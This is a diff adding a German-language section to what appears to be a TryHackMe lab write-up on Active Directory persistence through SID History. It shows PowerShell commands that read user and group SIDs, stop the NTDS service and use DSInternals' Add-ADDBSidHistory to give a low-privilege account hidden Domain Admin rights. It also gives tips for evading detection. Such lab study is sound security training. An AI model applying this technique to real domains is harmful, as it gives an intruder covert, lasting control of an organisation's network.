@@ -613,3 +613,125 @@ za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\THMDC.za.tryhackme.loc\c$\
 Wir haben also jetzt dauerhaften Zugang mit Hilfe eines Zertifikats.
 
 
+# Persistence through SID History
+
+Was sind SID? Die Security IDentifiers behalten die Security Pricipals und den Account Zugang im Auge, wenn diese auf Ressourcen zugreifen. Was sind Security Principals? Im Prinzip eine Entität, die vom Betriebssystem authentifiert werden kann wie bspw. ein Benutzer oder Computer, ein Thread oder Prozess der im Kontext eines Benutzers oder Computerkontos im Hinblick auf Sicherheit ausgeführt wird. 
+Jeder Security Principal wird durch eine eindeutige SID abgebildet.
+
+Es gibt ein interessantes Attribut bei Accounts mit dem Namen SID History.
+
+Der eigentliche Sinn von SID History dient dazu, den Zugang zu einem Account zu ermöglichen, um diesen zu klonen. Das ist nützlich wenn ein Unternehmen damit beschäftigt ist eine Active Directory Migration durchzuführen, da dies erlaubt einen Zugang zur Domain zu behalten, während diese zu einer anderen Domain migriert wird. 
+Der User hat in der neuen Domain auch eine neue SID, aber wir können die existierende SID des Users der SID History hinzufügen, was ihm erlaubt immernoch Zugang zur alten Domain zu haben mit dem neuen Account. 
+Die SID History ist für die Migrations sehr nützlich, aber auch für uns, wenn wir unseren Zugang zu dem System sichern möchten.
+
+### History Can Be Whatever We Want It To Be
+
+Das Ding ist, SID Histroy ist nicht nur darauf beschränkt, SID´s von anderen Domains zu enthalten. Mit den richtigen Rechten können wir einfach eine SID unserer aktuellen Domain zur SID History eines Accounts hinzufügen, den wir unter Kontrolle haben. Einige interessante Dinge über diese Persistence Technik:
+
+- Wir benötigen normalweise Domain Admin Privilegien oder ein Equivalent um diese Attacke auszuführen
+- Wenn der Account ein Login Event erstellt, die zu dem Account gehörenden SID´s werden dem User Token hinzugefügt. Das legt somit die Privilegien fest, die dieser Account hat. Das beinhaltet auch Gruppen SID´s
+- Wir können diese Attacke noch einen Schritt weiter treiben, wenn wir die Enterprise Admin SID injezieren. Das würde unsere Account Privilegien auf das Level eines Domain Admins für alle Domains im Forest heben. 
+- Sobald die SID´s zu dem User Token hinzugefügt werden, werden die Privilegien sofort anerkannt, auch wenn der Account kein Mitglied der aktuellen Gruppe ist. Das macht die Methode sehr hinterhältig.  Wir haben alle Berechtigungen um die gesamte Domain zu kompromettieren (womöglich des gesamten Forests), aber unser Account kann einfach ein ganz normaler User Account sein der Mitglied der Domain User Gruppe ist. Wir können noch hinterlistiger sein, wenn wir diesen Account jedesmal dazu nutzen, die SID History eines anderen Accounts zu bearbeiten, sodass der ursprüngliche Angriffsvektor nicht so leicht zu erkennen ist.
+
+Okay lets got
+
+### Forging History
+
+Erstmal per SSH auf den DC connecten. Lass uns erstmal paar Information sammeln.
+Als erstes schauen wir, das unser Low-Priv User keine Informationen in seiner SID History hat. 
+
+```bash
+za\aaron.jones@THMCHILDDC C:\Users\Administrator.ZA>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator.ZA> Get-ADUser <your ad username> -properties sidhistory,memberof
+
+DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
+Enabled           : True
+GivenName         : Aaron
+MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
+Name              : aaron.jones
+ObjectClass       : user
+ObjectGUID        : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22
+SamAccountName    : aaron.jones
+SID               : S-1-5-21-3885271727-2693558621-2658995185-1429
+SIDHistory        : {}
+Surname           : Jones
+UserPrincipalName :
+```
+
+Kein Eintrag in SIDHistory, also weiter gehts. Wir schauen uns die SID der Domain Admin Gruppe an, da wir diese zu unserer SID History hinzufügen möchten.
+
+```bash
+PS C:\Users\Administrator.ZA> Get-ADGroup "Domain Admins"
+
+DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
+GroupCategory     : Security
+GroupScope        : Global
+Name              : Domain Admins
+ObjectClass       : group
+ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
+SamAccountName    : Domain Admins
+SID               : S-1-5-21-3885271727-2693558621-2658995185-512
+```
+
+Wir könnten sowas wie Mimikatz nutzen um SID History hinzuzufügen. Allerdings zickt Mimikatz etwas rum, wenn man LSASS patchen möchte um die die SID History zu bearbeiten. 
+Wir probieren es mal mit [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) die ntds.dit Datei direkt zu patchen, also ***DIE*** AD Datenbank 
+
+```bash
+PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
+PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
+PS C:\Users\Administrator.ZA>Start-Service -Name ntds 
+```
+
+Wir mussten den NTDS Service stoppen, da die Datenbank sonst gesperrt ist und wir die SID History nicht bearbeiten könnten. Danach mussten wir natürlich den NTDS Service wieder restarten. 
+
+Wir können uns jetzt mit unserem low-priv Account auf die WHMWRK1 Maschine per SSH einloggen und überprüfen, ob die SID History geupdated wurde und wir Domain Admin Privilegien haben:
+
+```bash
+za\aaron.jones@THMWRK1 C:\Users\aaron.jones>powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved. 
+
+PS C:\Users\aaron.jones> Get-ADUser aaron.jones -Properties sidhistory 
+
+DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc 
+Enabled : True 
+GivenName : Aaron 
+Name : aaron.jones 
+ObjectClass : user 
+ObjectGUID : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22 
+SamAccountName : aaron.jones 
+SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512} 
+Surname : Jones 
+UserPrincipalName : 
+
+PS C:\Users\aaron.jones> dir \\thmdc.za.tryhackme.loc\c$ 
+
+Directory: \\thmdc.za.tryhackme.loc\c$ 
+
+Mode LastWriteTime Length Name 
+---- ------------- ------ ---- 
+d----- 9/15/2018 8:19 AM PerfLogs 
+d-r--- 5/11/2022 10:32 AM Program Files 
+d----- 3/21/2020 8:28 PM Program Files (x86) 
+d----- 4/25/2022 7:13 PM tmp 
+da---- 5/11/2022 10:11 AM Tools 
+d-r--- 4/27/2022 8:22 AM Users 
+d----l 4/25/2022 7:11 PM vagrant 
+d----- 4/27/2022 8:12 PM Windows 
+-a---- 1/4/2022 7:47 AM 103 delete-vagrant-user.ps1 
+-a---- 5/1/2022 9:11 AM 169 dns_entries.csv 
+-a---- 5/1/2022 9:17 AM 1725 thm-network-setup-dc.ps1
+```
+
+Es funktioniert. Unser low-priv User ist Domain Admin was ziehmlich cool ist. Selbst mit den wirklich absoluten High-End Rechten lässt sich das SID History Attribut nicht so ohne weiteres entfernen. 
+
+Selbst wenn du einen SID History Eintrag löschen möchtest, musst du erstmal einen finden. Kein normales Tool zeigt dir nämlich an, dass etwas nicht stimmt. Der entsprechende User taucht nichtmal in der Domain Admin Gruppe auf. Man muss wirklich penibel die Attribute herausfiltern, was die ganze Sache sehr schwierig macht. Denn die SID History wird nur einmal angewendet, wenn der User sich authentifiziert.
+
+# Persistence through Group Membership
+
+
+
+
